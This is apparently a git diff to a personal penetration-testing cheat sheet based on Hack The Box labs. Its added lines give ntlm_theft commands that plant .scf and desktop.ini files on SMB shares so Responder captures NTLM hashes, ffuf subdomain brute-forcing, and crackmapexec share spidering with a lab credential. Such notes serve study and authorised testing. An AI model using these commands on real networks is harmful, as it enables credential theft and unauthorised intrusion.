@@ -732,6 +732,17 @@ menu
 Invoke-Binary /opt/privsc/winPEASx64.exe
 ```
 
+## Ntlm theft from the smb and web
+- Using [ntlm_theft](https://github.com/Greenwolf/ntlm_theft) repository we can create file extensions
+- We can create multile extension, cross-check supported files
+```powershell
+python3 ntlm_theft.py -g all -s <ip_of_smb_catcher_server> -f <base_file_name>
+python3 ntlm_theft.py --generate scf --server 10.10.14.7 --filename desktop # Specified .scf file extention you call all as well
+python3 ntlm_theft.py --generate desktopini --server 10.10.14.7 --filename ntlm_theft # it is generated desktop.ini, Flight-HTB
+#upload file .scf is accepted, desktop.ini is uploaded in the smb share got the hash in responder
+sudo responder -I tun0 -v  # wait 2 minitues
+```
+
 ## Mimikatz
 
 ```powershell
@@ -1048,6 +1059,12 @@ curl -i http://192.168.50.16:5002/users/v1
 - If there is any Input field check for **Remote Code execution** or **SQL Injection**
 - Check the URL, whether we can leverage **Local or Remote File Inclusion**.
 - Also check if there’s any file upload utility(also obtain the location it’s getting reflected)
+
+### subdomain Enumeration 
+- If a website has no response from the input fields and button go brute force sub domains
+```bash
+ffuf -u "http://flight.htb/" -H "Host: FUZZ.flight.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fl 155  # Flight HTB
+```
 
 ### Wordpress
 
@@ -2798,7 +2815,7 @@ Get-DomainUser -PreauthNotRequired -verbose # identifying AS-REP roastable accou
 
 Get-NetUser -SPN | select serviceprincipalname #Kerberoastable accounts
 ```
-### Domain
+### Domain joined
 
 - Check weather the Windows OS joined in domain or not
   
@@ -3181,7 +3198,10 @@ crackmapexec smb <Rhost/range> -u user.txt -p 'password' --continue-on-success  
 
 # recursively check the smb shares using the crackmapexec
 crackmapexec smb 10.10.10.182 -u 's.smith' -p 'sT333ve2' -M spider_plus # Cascade HTB
-jq . /tmp/cme_spider_plus/10.10.10.182.json
+jq . /tmp/cme_spider_plus/10.10.10.182.json # Show you all shares created date 
+cat /tmp/cme_spider_plus/10.10.11.187.json | jq ' . | keys ' # List the shares Flight-HTB
+cat /tmp/cme_spider_plus/10.10.11.187.json | jq ' . | map_values(keys) ' # List directories one by one 
+
 
 #Try --local-auth option if nothing comes up
 crackmapexec smb <Rhost/range> -u 'user' -p 'password' --shares #lists all shares, provide creds if you have one
